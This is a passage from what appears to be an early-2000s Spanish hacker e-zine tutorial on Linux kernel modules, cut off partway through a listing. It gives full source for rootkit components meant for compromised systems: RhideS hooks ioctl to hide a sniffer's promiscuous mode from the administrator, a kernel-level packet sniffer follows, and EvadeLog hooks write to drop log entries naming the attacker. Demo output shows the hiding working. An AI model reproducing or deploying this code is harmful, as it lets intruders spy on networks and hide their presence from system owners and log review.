+#define IFF_DEBUG       0x4             /* turn on debugging            */
+#define IFF_LOOPBACK    0x8             /* is a loopback net            */
+#define IFF_POINTOPOINT 0x10            /* interface is has p-p link    */
+#define IFF_NOTRAILERS  0x20            /* avoid use of trailers        */
+#define IFF_RUNNING     0x40            /* resources allocated          */
+#define IFF_NOARP       0x80            /* no ARP protocol              */
+#define IFF_PROMISC     0x100           /* receive all packets          */
+#define IFF_ALLMULTI    0x200           /* receive all multicast packets*/
+#define IFF_MASTER      0x400           /* master of a load balancer    */
+#define IFF_SLAVE       0x800           /* slave of a load balancer     */
+#define IFF_MULTICAST   0x1000          /* Supports multicast           */
+#define IFF_VOLATILE    (IFF_LOOPBACK|IFF_POINTOPOINT|IFF_BROADCAST|IFF_ALLMULTI)
+#define IFF_PORTSEL     0x2000          /* can set media type           */
+#define IFF_AUTOMEDIA   0x4000          /* auto media select active     */
+#define IFF_DYNAMIC     0x8000          /* dialup device with changing addresses*/
+
+(...)
+
+struct ifreq
+{
+#define IFHWADDRLEN     6
+#define IFNAMSIZ        16
+        union
+        {
+                char    ifrn_name[IFNAMSIZ];            /* if name, e.g. "en0" */
+        } ifr_ifrn;
+
+        union {
+                struct  sockaddr ifru_addr;
+                struct  sockaddr ifru_dstaddr;
+                struct  sockaddr ifru_broadaddr;
+                struct  sockaddr ifru_netmask;
+                struct  sockaddr ifru_hwaddr;
+                short   ifru_flags;
+                int     ifru_ivalue;
+                int     ifru_mtu;
+                struct  ifmap ifru_map;
+                char    ifru_slave[IFNAMSIZ];   /* Just fits the size */
+                char    ifru_newname[IFNAMSIZ];
+                char *  ifru_data;
+        } ifr_ifru;
+};
+
+#define ifr_name        ifr_ifrn.ifrn_name      /* interface name       */
+#define ifr_hwaddr      ifr_ifru.ifru_hwaddr    /* MAC address          */
+#define ifr_addr        ifr_ifru.ifru_addr      /* address              */
+#define ifr_dstaddr     ifr_ifru.ifru_dstaddr   /* other end of p-p lnk */
+#define ifr_broadaddr   ifr_ifru.ifru_broadaddr /* broadcast address    */
+#define ifr_netmask     ifr_ifru.ifru_netmask   /* interface net mask   */
+#define ifr_flags       ifr_ifru.ifru_flags     /* flags                */
+#define ifr_metric      ifr_ifru.ifru_ivalue    /* metric               */
+#define ifr_mtu         ifr_ifru.ifru_mtu       /* mtu                  */
+#define ifr_map         ifr_ifru.ifru_map       /* device map           */
+#define ifr_slave       ifr_ifru.ifru_slave     /* slave device         */
+#define ifr_data        ifr_ifru.ifru_data      /* for use by interface */
+#define ifr_ifindex     ifr_ifru.ifru_ivalue    /* interface index      */
+#define ifr_bandwidth   ifr_ifru.ifru_ivalue    /* link bandwidth       */
+#define ifr_qlen        ifr_ifru.ifru_ivalue    /* Queue length         */
+#define ifr_newname     ifr_ifru.ifru_newname   /* New name             */
+
+(...)
+
+---/ include/linux/if.h /---
+
+
+     Si os habeis fijado la flag que os habra llamado la atencion es 
+IFF_PROMISC, y el campo de la estructura es ifr_ifru.ifru_flags, que como
+podemos ver tiene definido un alias como ifr_flags, sino os habiais dado
+cuenta ya lo sabies :)
+
+     ¿Que tenemos que hacer pues en nuestro modulo? Pues troyanizar la
+syscall ioctl para que cuando se haga una peticion SIOCGIFFLAGS no se
+muestre la flag IFF_PROMISC. Parece facil de hacer, pero hay una
+complicacion. Si el propio administrador coloca la interface de red en modo
+promiscuo y este ve que ifconfig le dice que no esta en promisc mode
+sospechara ¿no creeis?. Solucion: usar una variable que indicara si debe o
+no mostrarse el modo promiscuo. Nuestro modulo se encargara de capturar los 
+SIOCSIFFLAGS que quieran establecer el modo prmiscuo o quitarlo para colocar
+dicha variable con el valor adecuado. ¿Vemos el modulo? Venga.
+
+---/ rhides.c /---
+
+/*
+ * TILE: RhideS v1.0 <12/05/2001>
+ * 
+ * CODER: Ripe - <ripe@7a69ezine.org>
+ * 
+ * DECRP: Is usualy to install a sniffer when you hack some system, but if you
+ *        do it, the net device is established to promisc mode and if the 
+ *        admin is inteligent must to discover the sniffer. Using RhideS you
+ *        can to hide some promisc mode interface easily. Inserting the
+ *        module you can specify magic words.
+ *  
+ *        root@donasec.com ~# insmod rhides.o ins=mete del=saca
+ *        root@donasec.com ~#
+ * 
+ *        And you can insert a interface in the list using mv unix comand, 
+ *        very easy. ¿sure?
+ * 
+ * RECOM: ¿Will you use it to hack? Please hide the module :)
+ * 
+ * TESTED: This LKM have been tested withou problems on:
+ *           - Linux kernel 2.2.18pre21 (Debian 2.2)
+ *           - Linux kernel 2.2.18 (Debian 2.2)
+ *           - Linux kernel 2.2.19 (Debian 2.2)
+ * 
+ */ 
+
+#define __KERNEL__
+#define MODULE
+
+#include <linux/ctype.h>
+#include <linux/kernel.h>
+#include <linux/module.h>
+#include <linux/version.h>
+
+#include <linux/mm.h>
+#include <linux/if.h>
+
+#include <sys/syscall.h>
+
+#define _7A69SOFT_
+#define CODER       "Ripe"
+#define DEBUGMODE
+
+#define DEF_INS     "insert_if"
+#define DEF_DEL     "remove_if"
+
+#define IFNAMESIZE  32
+
+extern void *sys_call_table[];
+
+char *ins;
+char *del;
+
+struct {
+  char *ins;
+  char *del;
+} status;
+
+/*
+ * El tipo de dato para la lista enlazada :)
+ */
+typedef struct {
+  char interface[IFNAMESIZE+1];   /* Aqui el nombre de la interface      */
+  int promisc;                    /* ¿Debemos mostrar el modo promiscuo? */
+  struct lif *next;
+} lif;
+
+lif *if_list;
+
+/*
+ * Punteros a la syscalls originales.
+ */
+int (*o_rename)(const char *oldpath, const char *newpath);
+int (*o_ioctl)(int fd, int request, char *argp);
+
+/* warning save :) */
+lif *get_interface(char *);
+
+/*
+ * Rutinas para insertar y quitar elementos de la lista enlazada, y para
+ * comprobar si un elemento esta o no.
+ */
+void add_interface(char *interface) {
+  lif *ptr=if_list;
+#ifdef DEBUGMODE
+  printk("(RS) Adding %s interface to hide promisc mode list\n", interface);
+#endif
+  if (get_interface(interface)) return;
+  if (ptr) {
+    while (ptr->next) {
+      if (!strcmp(ptr->interface, interface)) return;
+      ptr=(lif *)ptr->next;
+    }
+    ptr->next=(struct lif *)kmalloc(sizeof(lif), GFP_KERNEL);
+    ptr=(lif *)ptr->next;
+    strncpy(ptr->interface, interface, IFNAMESIZE);
+    ptr->promisc=0;
+    ptr->next=NULL;
+  } else {
+    if_list=(lif *)kmalloc(sizeof(lif), GFP_KERNEL);
+    ptr=if_list;
+    strncpy(ptr->interface, interface, IFNAMESIZE);
+    ptr->promisc=0;
+    ptr->next=NULL;
+  }
+  return;
+}
+
+void del_interface(char *interface) {
+  lif *ptr=if_list, *ptr2;
+#ifdef DEBUGMODE
+  printk("(RS) Deleting %s interface from hide promisc mode list\n", interface);
+#endif
+  if (!ptr) return;
+  if (!strcmp(ptr->interface, interface)) {
+    if_list=(lif *)ptr->next;
+    kfree(ptr);
+    return;
+  }
+  while(ptr) {
+    if (!strcmp(ptr->interface, interface)) break;
+    ptr2=ptr;
+    ptr=(lif *)ptr->next;
+  }
+  if (ptr) {
+    ptr2->next=ptr->next;
+    kfree(ptr);
+  }
+  return;
+}
+
+lif *get_interface(char *interface) {
+  lif *ptr=if_list;
+  while(ptr) {
+    if (!strcmp(ptr->interface, interface)) return((lif *)ptr);
+    ptr=(lif *)ptr->next;
+  }
+  return(0);
+}
+
+/*
+ * Nuestro pequeño "hack" :)
+ */
+int my_ioctl(int fd, int request, char *argp) {
+  int o_ret;
+  struct ifreq ifreq_ret;
+  lif *ptr;
+  /*
+   * Si la peticion es un set para las flags de una interface se ejecutara
+   * este condicional.
+   */
+  if (request==SIOCSIFFLAGS) {
+    __generic_copy_from_user(&ifreq_ret, argp, sizeof(struct ifreq));
+    /*
+     * Miramos si la interface a la que se le quieren aplicar los flags
+     * esta en la lista o no, de no estarlo llamamos a la syscall original
+     * y retornamos su valor.
+     */
+    if ((ptr=get_interface(ifreq_ret.ifr_name))==0) return((*o_ioctl)(fd, request, argp));
+    /*
+     * En caso de estar en la lista miramos si la flag IFF_PROMISC se
+     * encuentra entre las flags a asignar, de ser asi pondremos 1 a
+     * ptr->promisc para que el modulo sepa que debe mostrar que la
+     * interface esta en modo promiscuo, esto es de lo que hablabamos antes.
+     */
+    if (ifreq_ret.ifr_flags & IFF_PROMISC) ptr->promisc=1;
+    else ptr->promisc=0;
+    ifreq_ret.ifr_flags=ifreq_ret.ifr_flags|IFF_PROMISC;
+    __generic_copy_to_user(argp, &ifreq_ret, sizeof(struct ifreq));
+  }
+  /*
+   * Si lo que se hace es solicitar las flags se ejecutara este otro
+   * condicional.
+   */
+  if (request==SIOCGIFFLAGS) {
+    /*
+     * Llamamos a la syscall original para extraer la flags reales
+     */
+    o_ret=(*o_ioctl)(fd, request, argp);
+    __generic_copy_from_user(&ifreq_ret, argp, sizeof(struct ifreq));
+    /*
+     * Si la interface no esta en la lista retornamos el valor real...
+     */
+    if ((ptr=get_interface(ifreq_ret.ifr_name))==0) return(o_ret);
+    /*
+     * ...de lo contrario comprobamos si debe mostrarse o no el modo
+     * promiscuo y si no debe mostrarse lo quitamos.
+     */
+    if ((!ptr->promisc) && (ifreq_ret.ifr_flags&IFF_PROMISC))
+      ifreq_ret.ifr_flags=ifreq_ret.ifr_flags^IFF_PROMISC;
+    /*
+     * Y ale.... aqui tienes los resultados :)
+     */
+    __generic_copy_to_user(argp, &ifreq_ret, sizeof(struct ifreq));
+    return(o_ret);   
+  }
+  return((*o_ioctl)(fd, request, argp));
+}
+
+/*
+ * Syscall que usamos para comunicarnos con el kernel. Ningun secreto.
+ */
+int my_rename(const char *oldpath, const char *newpath) {
+  if (!strcmp(newpath, status.ins)) {
+    add_interface((char *)oldpath);
+    return(0);
+  }
+  if (!strcmp(newpath, status.del)) {
+    del_interface((char *)oldpath);
+    return(0);
+  }
+  return((*o_rename)(oldpath, newpath));
+}
+
+/*
+ * Ahora te preguntaras.. ¿Y esto que pinta?
+ * Pues ni idea :)
+ */
+int init_module() {
+  status.ins=(char *)kmalloc(strlen(DEF_INS), GFP_KERNEL);
+  status.del=(char *)kmalloc(strlen(DEF_DEL), GFP_KERNEL);
+  strcpy(status.ins, DEF_INS);
+  strcpy(status.del, DEF_DEL);
+  if (ins) {
+    kfree(status.ins);
+    status.ins=ins;
+  }
+  if (del) {
+    kfree(status.del);
+    status.del=del;
+  }
+  o_ioctl=sys_call_table[__NR_ioctl];
+  o_rename=sys_call_table[__NR_rename];
+  sys_call_table[__NR_ioctl]=my_ioctl;
+  sys_call_table[__NR_rename]=my_rename;
+#ifdef DEBUGMODE
+  printk("(RS) RhideF by Ripe - <ripe@7a69ezine.org>\n");
+  printk("(RS) Loaded!\n");
+#endif
+  return(0);
+}
+
+void cleanup_module() {
+  sys_call_table[__NR_rename]=o_rename;
+  sys_call_table[__NR_ioctl]=o_ioctl;
+#ifdef DEBUGMODE
+  printk("(RS) RhideF by Ripe - <ripe@7a69ezine.org>\n");
+  printk("(RS) UnLoaded!\n");
+#endif
+}
+
+MODULE_AUTHOR("Ripe - <ripe@7a69ezine.org>");
+MODULE_DESCRIPTION("hack: Interface promisc mode hider");
+MODULE_PARM(ins, "s");
+MODULE_PARM(del, "s");
+
+---/ rhides.c /---
+
+     
+     Veamos, como funcionaria dicho modulo.
+
+     
+    barracuda ~# insmod rhides.o
+    barracuda ~# tcpdump -i eth0 &> /dev/tty12 &
+    [1] 237
+    eth0: Promiscuous mode enabled.
+    barracuda ~# ifconfig eth0
+    eth0      Link encap:Ethernet  HWaddr 00:E0:29:9A:D0:A9
+              inet addr:192.168.1.1  Bcast:192.168.1.255  Mask:255.255.255.0
+              UP BROADCAST RUNNING PROMISC MULTICAST  MTU:1500  Metric:1
+              RX packets:0 errors:0 dropped:0 overruns:0 frame:0
+              TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
+              collisions:0 txqueuelen:100
+              Interrupt:11 Base address:0xdc00
+    barracuda ~# touch eth0 ; mv eth0 insert_if ; rm eth0
+    barracuda ~# ifconfig eth0
+    eth0      Link encap:Ethernet  HWaddr 00:E0:29:9A:D0:A9
+              inet addr:192.168.1.1  Bcast:192.168.1.255  Mask:255.255.255.0
+              UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+              RX packets:0 errors:0 dropped:0 overruns:0 frame:0
+              TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
+              collisions:0 txqueuelen:100
+              Interrupt:11 Base address:0xdc00
+    barracuda ~#
+
+
+     El modo promiscuo queda oculto a ojos de indeseables (el administrador
+del sistema), pero claro... ahora es el propio administrador el que coloca
+la interface en modo promiscuo? :)
+
+    
+    barracuda ~# ifconfig eth0 promisc
+    eth0: Promiscuous mode enabled.
+    barracuda ~# ifconfig eth0
+    eth0      Link encap:Ethernet  HWaddr 00:E0:29:9A:D0:A9
+              inet addr:192.168.1.1  Bcast:192.168.1.255  Mask:255.255.255.0
+              UP BROADCAST RUNNING PROMISC MULTICAST  MTU:1500  Metric:1
+              RX packets:0 errors:0 dropped:0 overruns:0 frame:0
+              TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
+              collisions:0 txqueuelen:100
+              Interrupt:11 Base address:0xdc00
+    barracuda ~#
+
+
+     Perfecto! Funciona a las 1000 maravillas.
+ 
+
+
+
+    5.4. Sniffing desde el kernel
+    ----------------------------- 
+
+     Hay ocasiones en las que puede ser util realizar una captura de los
+paquetes que llegan a una maquina a nivel de kernel, ya sea para realizar un
+registros de los paquetes recividos por el kernel, para redireccinarlos a otra
+maquina, para manipularlos, o para hacer que el kernel realice alguna accion 
+tras la llegada de un determinado paquete.
+
+     Para poder hacer esto que nos planteamos debemos conocer el 
+funcionamiento de la pila TCP/IP del kernel de linux, para ello lo mas 
+conveniente seria leernos las fuentes del kernel, pero como no todos disponeis
+del tiempo (o las ganas) suficiente para hacerlo, tratare de comentar aqui los
+puntos mas importantes.
+
+     El kernel dispone de una serie de rutinas para procesar los paquetes 
+llegados en cada capa, cuando una capa ha procesado la cabecera que debia, 
+entregara el paquete a la rutina que se encargara de procesar la siguiente
+cabecera. Asi pues, en primer lugar, es necesario una rutina para procesar
+el paquete en la capa de enlace, y al terminar entregara el paquete a
+la rutrina encargada de procesar la capa de IP, y asi sucesivamente. Los
+paquetes procesados por el kernel pueden seguir distintos caminos, asi pues
+un paquete UDP no sera procesador por las mismas rutinas de uno TCP, pues la
+rutina que procesa la cabecera IP se encargara de entregar el paquete a
+rutinas distintas (una que sera la encargada de procesar UDP y otra TCP). Para
+comunicar cada una de las rutinas, el kernel se sirve de una structura llamada
+sk_buff, la cual podemos encontrar en linux/include/linux/skbuff.h, asi pues
+cuando un host recive un paquete por un dispositivo, este se encarga de crear
+la estructura sk_buff y la coloca en la cola.
+
+---/ include/linux/skbuff.h /---
+
+struct sk_buff {
+        struct sk_buff  *next;                  /* Next buffer in list      */
+        struct sk_buff  *prev;                  /* Previous buffer in list  */
+        struct sk_buff_head *list;              /* List we are on           */
+        struct sock     *sk;                    /* Socket we are owned by   */
+        struct timeval  stamp;                  /* Time we arrived          */
+        struct device   *dev;                   /* Device we arrived on/are leaving by          */
+
+        /* Transport layer header */
+        union
+        {
+                struct tcphdr   *th;
+                struct udphdr   *uh;
+                struct icmphdr  *icmph;
+                struct igmphdr  *igmph;
+                struct iphdr    *ipiph;
+                struct spxhdr   *spxh;
+                unsigned char   *raw;
+        } h;
+
+        /* Network layer header */
+        union
+        {
+                struct iphdr    *iph;
+                struct ipv6hdr  *ipv6h;
+                struct arphdr   *arph;
+                struct ipxhdr   *ipxh;
+                unsigned char   *raw;
+        } nh;
+
+        /* Link layer header */
+        union
+        {
+                struct ethhdr   *ethernet;
+                unsigned char   *raw;
+        } mac;
+
+        struct  dst_entry *dst;
+
+        char            cb[48];
+
+        unsigned int    len;                    /* Length of actual data     */
+        unsigned int    csum;                   /* Checksum                  */
+        volatile char   used;                   /* Data moved to user and not MSG_PEEK          */
+        unsigned char   is_clone,               /* We are a clone            */
+                        cloned,                 /* head may be cloned (check refcnt to be sure). */
+                        pkt_type,               /* Packet class              */
+                        pkt_bridged,            /* Tracker for bridging      */
+                        ip_summed;              /* Driver fed us an IP checksum */
+        __u32           priority;               /* Packet queueing priority  */
+        atomic_t        users;                  /* User count - see datagram.c,tcp.c            */
+        unsigned short  protocol;               /* Packet protocol fromdriver. */
+        unsigned short  security;               /* Security level of packet  */
+        unsigned int    truesize;               /* Buffer size               */
+        unsigned char   *head;                  /* Head of buffer            */
+        unsigned char   *data;                  /* Data head pointer         */
+        unsigned char   *tail;                  /* Tail pointer              */
+        unsigned char   *end;                   /* End pointer               */
+        void            (*destructor)(struct sk_buff *);        /* Destruct function            */
+#ifdef CONFIG_IP_FIREWALL
+        __u32           fwmark;                 /* Label made by fwchains, used by pktsched     */
+#endif
+#if defined(CONFIG_SHAPER) || defined(CONFIG_SHAPER_MODULE)
+        __u32           shapelatency;           /* Latency on frame */
+        __u32           shapeclock;             /* Time it should go out */
+        __u32           shapelen;               /* Frame length in clocks */
+        __u32           shapestamp;             /* Stamp for shaper    */
+        __u16           shapepend;              /* Pending */
+#endif
+
+#if defined(CONFIG_HIPPI)
+        union{
+                __u32   ifield;
+        } private;
+#endif
+};
+
+---/ include/linux/skbuff.h /---
+
+     Como podemos ver se trata de una lista doblemente enlazada, en la que
+dentro de cada elemento los punteros next y prev apuntan al siguiente y el
+anterior elemento de la lista respectivamente.
+
+     Los datos a destacar dentro de sk_buff, sean posiblemente los que voy a
+comentar a continuacion:
+
+     -> struct device *dev: Indica el dispositivo que se esta usando.
+
+     -> union h: Contiene la cabecera de la capa de transporte
+
+     -> union nh: (Network Header) Contiene la cabecera de la capa de red.
+    
+     -> unsigned char pkt_type: Muestra el tipo de paquete que contiene la
+structura sk_buf. Sus valores pueden ser; PACKET_HOST (si es para nosotros),
+PACKET_BROADCAST (si es para todos), PACKET_MULTICAST (si es para un grupo
+determinado), PACKET_OTHERHOST (si el paquete es para otro host),
+PACKET_OUTGOING (si es un paquete saliente), PACKET_LOOPBACK (si es un
+paquete loopback) o PACKET_FASTROUTE.
+     
+     -> struct char *data: Puntero que indicara donde se encuentran los
+datos del paquete.
+     
+     De todos estos campos el unico que esta correctame asignado es el que
+contiene la network header, los demas deberan ser reajustados por nosotros.
+En el ejemplo le vereis mas claro.
+     
+     Bien, ya sabemos mas o menos lo que ocurre con los paquetes que llegan
+por una interface de red, ahora la cuestion esta enconseguir capturarlos, en
+lograr que una rutina nuestra insertada en el kernel sea capaz de procesar
+los paquetes, para ello necesitamos insertar una rutina en la lista de
+rutinas por las que deben pasar los paquetes, para ello usaremos
+dev_add_pack(), a la cual le pasaremos por argumento una structura
+packet_type. 
+
+---/ include/linux/netdevice.h /---
+
+struct packet_type
+{
+        unsigned short          type;   /* This is really htons(ether_type). */
+        struct device           *dev;   /* NULL is wildcarded here           */
+        int                     (*func) (struct sk_buff *, struct device *,
+                                         struct packet_type *);
+        void                    *data;  /* Private to the packet type        */
+        struct packet_type      *next;
+};
+
+---/ include/linux/netdevice.h /---
+
+     En el campo type asignaremos siempre el valor de ETH_P_ALL para
+capturar todos los paquetes y en func podremos un apuntador a la rutina que
+nosotros hemos escrito para procesar cada unos de los paquetes que llegan.
+Dicha rutina, como podemos ver, precisa de 3 argumentos un puntero a una
+estructura sk_buf, otro a una struct device y otro a una struct packet_type.
+Para ver las cosas mas claras voy a presentar aqui un sencillisimo sniffer
+que captura los paquetes en ring0 y loguea los paquetes que llegan en
+/var/log/messages. No creo que haya muchas dudas sobre como funciona esto,
+aun asi he intentado comentar bastante el codigo para que se entienda a la
+perfeccion, no os quejareis :)
+
+---/ snif_in_krnl.c /---
+
+/*
+ * TILE: Snif in kernel (pachanga version 1)
+ *
+ * CODER: Ripe - <ripe@7a69ezine.org>
+ *
+ * DESCR: This a very fucked sniffer for linux kernel 2.2.x. Don't fuckme 
+ *        please. It's only an example :P
+ *
+ * USAGE: I don't know.... ehehehe.
+ *
+ * RECOM: Put a finger on your anus.
+ *
+ * TESTED: This LKM habe been tested without problems on:
+ *           - Linux kernel 2.2.18pre10 (Debian 2.2)
+ *           - Linux kernel 2.4.6 (Debian 2.2)
+ *
+ */
+
+#define __KERNEL__
+#define MODULE
+
+#include <linux/kernel.h>
+#include <linux/module.h>
+#include <linux/version.h>
+#include <linux/ctype.h>
+
+#include <linux/ip.h>
+#include <linux/icmp.h>
+#include <linux/tcp.h>
+#include <linux/udp.h>
+
+#include <linux/skbuff.h>
+#include <linux/netdevice.h>
+
+void sniffer_icmp(struct sk_buff *skb);
+void sniffer_tcp(struct sk_buff *skb);
+void sniffer_udp(struct sk_buff *skb);
+
+/*
+ * Estructura que registraremos mas adelante en el kernel, para que una rutina
+ * nuestra pueda leer los paquetes que pasan por el kernel.
+ */
+struct packet_type my_pkt;
+
+/*
+ * Rutina que leera los paquetes en ring0.
+ */
+int sniffer(struct sk_buff *skb, struct device *dev, struct packet_type *pkt) {
+  /*
+   * Reajustamos los campos :)
+   */ 
+  skb->h.raw = skb->nh.raw + skb->nh.iph->ihl*4;
+  skb->data = (unsigned char *)skb->h.raw +(skb->h.th->doff <<2);
+  skb->len -= skb->nh.iph->ihl*4 + (skb->h.th->doff << 2);
+  /*
+   * Comprobamos que el paquetito es para nosotros. Si no lo es pasamos
+   * olimpicamente de el.
+   */
+  if (skb->pkt_type!=PACKET_HOST) {
+    kfree_skb(skb);
+    return(0);    /* Oppps! esto no es mio */
+  }
+  /*
+   * Ahora miraremos de que protocolo se trata, para asi pasar el sk_buff a
+   * una rutina que se encargara de formatear la salida en el /var/log/messages
+   * Como deciamos, nos encargamos de entregar el sk_buff a una rutina 
+   * distinta dependiendo del paquete que este transporta, de esta manera
+   * el source queda algo mas ordenado :)
+   */
+  switch(skb->nh.iph->protocol) {
+  case 1:    /* ICMP */
+      sniffer_icmp(skb);
+      break;
+  case 6:    /* TCP */
+      sniffer_tcp(skb);
+      break;
+  case 17:   /* UDP */
+      sniffer_udp(skb);
+      break;
+  defautl:
+      printk("----\n");
+      printk("No se de que va este paquete!!!!!\n");
+  }
+  /*
+   * Ya no queremos saber mas del paquetito.
+   */
+  kfree_skb(skb);
+  return(1);    /* Todo correcto */
+}
+
+/*
+ * Las 3 siguientes rutinas se encargaran de mostrar el paquete llegado en
+ * /var/log/messages segun el protocolo que contenga cada uno de los
+ * paquetitos que llegan.
+ */
+void sniffer_icmp(struct sk_buff *skb) {
+  printk("----\n");
+  printk("IP origne(hex)   : %X\n", skb->nh.iph->saddr);
+  printk("IP destino(hex)  : %X\n", skb->nh.iph->daddr);
+  printk("ICMP type(hex)   : %X\n", skb->h.icmph->type);
+  printk("ICMP code(hex)   : %X\n", skb->h.icmph->code);
+}
+
+void sniffer_tcp(struct sk_buff *skb) {
+  printk("----\n");
+  printk("IP origne(hex)   : %X\n", skb->nh.iph->saddr);
+  printk("IP destino(hex)  : %X\n", skb->nh.iph->daddr);
+  printk("TCP origen(hex)  : %X\n", skb->h.th->source);
+  printk("TCP destino(hex) : %X\n", skb->h.th->dest);
+  printk("TCP seq(hex)     : %X\n", skb->h.th->seq);
+  printk("TCP ack_seq(hex) : %X\n", skb->h.th->ack_seq);
+}
+
+void sniffer_udp(struct sk_buff *skb) {
+  printk("----\n");
+  printk("IP origne(hex)   : %X\n", skb->nh.iph->saddr);
+  printk("IP destino(hex)  : %X\n", skb->nh.iph->daddr);
+  printk("UDP origen(hex)  : %X\n", skb->h.uh->source);
+  printk("UDP destino(hex) : %X\n", skb->h.uh->dest);
+}
+
+/*
+ * La funciones de siempre. Zona de carga y descarga, prohivido aparcar de
+ * 9h a 18h :)
+ */
+int init_module() {
+  /*
+   * Preparamos la estructura packet_type para registrarla luego en la lista
+   * del kernel.
+   */
+  my_pkt.type=htons(ETH_P_ALL);  /* Lo queremos ver todo */
+  my_pkt.func=sniffer;           /* Nuestra rutina que procesara el sk_buf */
+  /*
+   * Ahora llega el momento de registrar la estructura, para ello usamos
+   * dev_add_pack(), como ya dije anteriormente.
+   */
+  dev_add_pack(&my_pkt);
+  /*
+   * Pos yasta!! :)
+   */
+  return(0);
+}
+
+void cleanup_module() {
+  /*
+   * Al descargar el modulo debemos desregistrar nuestra estructura
+   * packet_type, sino se puede armar la de cristo en nuestro kernel :)
+   */
+  dev_remove_pack(&my_pkt);
+}
+
+---/ snif_in_kernel.c /---
+
+     Bueno, este snifer es realmente una chapuza, espero que no me
+critiqueis por ello, pues la unica intencion de este source era la de
+ilustrar como es posible capturar paquetes en ring0. No lo he dicho antes,
+pero eta comentado en el texto, para volver a dejar las cosas como estavan
+antes, y avitar asi nuestro kerido kernel panic al descargar el modulo
+debemos usar dev_remove_pack() en cleanup_module().
+
+     Obiamente el poder snifar paquetes a nivel de kernel de mucho, juego,
+pero no sere yo quien os de las ideas, sino vosotros, que tambien hay que
+currarselo de vez en cuando :)
+
+
+
+
+    5.5. Evitando los logs del systema
+    ----------------------------------
+    
+     Que bonito seria estar seguros que nuestra IP no saldra en ningun lugar
+de la maquina que atacamos ¿no? Pues esto es posible si indagamos un poco en
+el kernel. ¿Como hace nuestro linux para escribir en un fichero? Sencillo,
+usando la syscall write. El segundo argumento de write es un puntero al
+buffer que debera escribirse el el fichero (socket o lo que sea) que esta
+relacionado al decriptor de ficheo, por lo que solo tendriamos que comprobar
+que en dicho buffer no hay nada que pueda comprometernos, y en caso de que
+lo haya omitir el write. ¿Como haremos nosotros? Pues como siempre... Una
+lista enlazada con palabras prohividas (Nene no digas "puta"), y haciendo
+el rollo de siempre. Meter en lugar de write una rutina nuestra :)
+
+---/ evadelog.c /---
+
+/*
+ * TILE: EvadeLog v1.0 <14/6/2001>
+ *
+ * CODER: Ripe - <ripe@7a69ezine.org>
+ *
+ * DESCR: This is a log evader LKM. In this module I filter all write syscalls
+ *        that have got a string in hide list. The usage is very easy, you can
+ *        add/del strings to hide list using mv UNIX command. See that.
+ *
+ *        root@donasec.com ~# insmod evadelog.o ins=mete del=saca [-f]
+ *        root@donasec.com ~#
+ *
+ *        You'll avoid that string must be printed using "mv <string> mete"
+ *
+ * RECOM: If you use this LKM in a hacked system I recomend revise the
+ *        source (script-kidiie sux) and hider this LKM using hider.c :)
+ *
+ * TESTED: This LKM have been tested without problems on:
+ *           - Linux Kernel 2.2.18pre10 (Debian 2.2)
+ *           - Linux Kernel 2.2.18 (Debian 2.2)
+ */
+
+#define __KERNEL__
+#define MODULE
+
+#include <linux/ctype.h>
+#include <linux/kernel.h>
+#include <linux/module.h>
+#include <linux/version.h>
+
+#include <linux/mm.h>
+
+#include <sys/syscall.h>
+
+#define _7A69SOFT_
+#define CODER       "Ripe"
+#define DEBUGMODE
+
+#define DEF_INS     "insert_str"
+#define DEF_DEL     "delete_str"
+
+extern void *sys_call_table[];
+
+char *ins;
+char *del;
+
+struct {
+  char *ins;
+  char *del;
+} status;
+
+/*
+ * La lista enlazada :)
+ */
+typedef struct {
+  char *str;
+  struct lstr *next;
+} lstr;
+
+lstr *s_list;
+
+/*
+ * Punteros a las syscalls originales.
+ */
+int (*o_rename)(const char *oldpath, const char *newpath);
+int (*o_write)(int fd, const void *buf, int count);
+
+void my_bzero(char *buf, int size) {
+  memset(buf, 0, size);
+}
+
+/*
+ * Estas son las rutinas que usaremos para gestionar la lista enlazada que
+ * contendra los strings a ocultar.
+ */
+void add_str(char *str) {
+  lstr *ptr=s_list;
+#ifdef DEBUGMODE
+  printk("(EL) Adding \"%s\" string to hide list\n", str);
+#endif
+  if (is_str(str)==1) return;
+  if (ptr) {
+    while (ptr->next) {
+      if (!strcmp(ptr->str, str)) return;
+      ptr=(lstr *)ptr->next;
+    }
+    ptr->next=(struct lstr *)kmalloc(sizeof(lstr), GFP_KERNEL);
+    ptr=(lstr *)ptr->next;
+    ptr->str=(char *)kmalloc(strlen(str)+1, GFP_KERNEL);
+    strcpy(ptr->str, str);
+    ptr->next=NULL;
+  } else {
+    s_list=(lstr *)kmalloc(sizeof(lstr), GFP_KERNEL);
+    ptr=s_list;
+    ptr->str=(char *)kmalloc(strlen(str)+1, GFP_KERNEL);
+    strcpy(ptr->str, str);
+    ptr->next=NULL;
+  }
+  return;
+}
+
+void del_str(char *str) {
+  lstr *ptr=s_list, *ptr2;
+#ifdef DEBUGMODE
+  printk("(EL) Deleting \"%s\" string from hide list\n", str);
+#endif
+  if (!ptr) return;
+  if (!strcmp(ptr->str, str)) {
+    s_list=(lstr *)ptr->next;
+    kfree(ptr->str);
+    kfree(ptr);
+    return;
+  }
+  while(ptr) {
+    if (!strcmp(ptr->str, str)) break;
+    ptr2=ptr;
+    ptr=(lstr *)ptr->next;
+  }
+  if (ptr) {
+    ptr2->next=ptr->next;
+    kfree(ptr->str);
+    kfree(ptr);
+  }
+  return;
+}
+
+int is_str(char *str) {
+  lstr *ptr=s_list;
+  while(ptr) {
+    if (!strcmp(ptr->str, str)) return(1);
+    ptr=(lstr *)ptr->next;
+  }
+  return(0);
+}
+
+/*
+ * Con esta funcion comprobamos si el buffer pasado contiene en su interior
+ * alguno de los elementos de la lista enlazada.
+ */
+int hide_str(char *buf) {
+  lstr *ptr=s_list;
+  if (!ptr) return(0);
+  while(ptr) {
+    if (strstr(buf, ptr->str)) return(1);
+    ptr=(lstr *)ptr->next;
+  }
+  return(0);
+}
+
+/*
+ * Usaremos, como en otras ocasiones, sys_rename para comunicarnos on el
+ * kernel.
+ */
+int my_rename(const char *oldpath, const char *newpath) {
+  if (!strcmp(newpath, status.ins)) {
+    add_str((char *)oldpath);
+    return(0);
+  }
+  if (!strcmp(newpath, status.del)) {
+    del_str((char *)oldpath);
+    return(0);
+  }
+  return((*o_rename)(oldpath, newpath));
+}
+
+/*
+ * Esta es la syscall write troyanizada... que malos somos :P
+ */
+int my_write(int fd, const void *buf, int count) {
+  int ret;
